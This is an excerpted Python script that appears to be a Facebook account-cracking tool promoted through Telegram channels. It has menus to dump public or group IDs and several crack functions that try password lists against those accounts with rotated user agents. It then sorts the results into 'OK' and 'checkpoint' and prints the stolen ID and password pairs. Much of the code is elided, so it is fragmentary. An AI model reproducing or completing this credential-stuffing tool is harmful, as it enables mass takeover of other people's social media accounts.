...
g = datetime.datetime(2023, 12, 8, 10, 00, 00)
if x.strftime('%x') > g.strftime('%x'):
    print("\033[1;31m TOOL RAGIRA\n\033[1;32m NAMA REPO @ESP_REPO")
    os.system('xdg-open @ESP_REPO')
    exit()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
...
\033[1;33m───▐██──▀▀──▀▀──██▌───
\033[1;34m──▄████▄──▐▌──▄████▄──
 \x1b[1;32m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[1;32m: قناتي لفك تشفير @ZZKGZ
 \x1b[1;33m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌   \x1b[1;33m: \x1b[1;33m @ESP_REPO
 \x1b[1;35m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  قناتي لفك تشفير @ZZKGZ \x1b[1;35m: 
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ REPO  ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                                      
			{m}{k}{h}{sir} {x}{m}{k}{h}{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def menu(my_name,my_id):
	...
	print('\x1b[1;97m\033[35m[1] CRACK PUPLIC')
...
def dump_massal():
	try:
		...
		exit()
	try:
		kumpulkan = int(input('\x1b[1;92mCRACK ID LIMIT : '))
		print()
	except ValueError:
	    exit()
...
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> أدخل معرف المجموعة :\x1b[1;94m ")
...
def setting():
	os.system('clear')
	banner()
	cetak(('\t[bold cyan]          •YAKEKYAN HALBZHERA • [/bold cyan]'))
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'[1 ] OLD CLONE')
	print('[ 2 ] NEW CLONE')
...
#	elif hc in ['4','04']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\033[93m[ + ] SHOW APPS (T) :  ')
	if _jembot_ in ['']:
		print(' Chouse ')
		back()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[REPO]    {P}{b}{loop}{P}•{b}{len(id)}{P}  [ OK ]{P}{H}{ok}{P}  [ CP ]{P}{M}{cp}{P}  /  ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "REPO checkpoint" in po.cookies.get_dict().keys():
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rrREPO¬ [OK]:%s  [CP]:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[REPO] ID       : {idf} [MOD] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[bold green][REPO ok] ID       : {idf}\n[REPO ok] PASSWORD : {pw}\n[REPO ok][/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s REPO %s/%s  [OK]:%s  [CP]:%s  %s%s%s REPO'%(bi,loop,len(id2),    ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
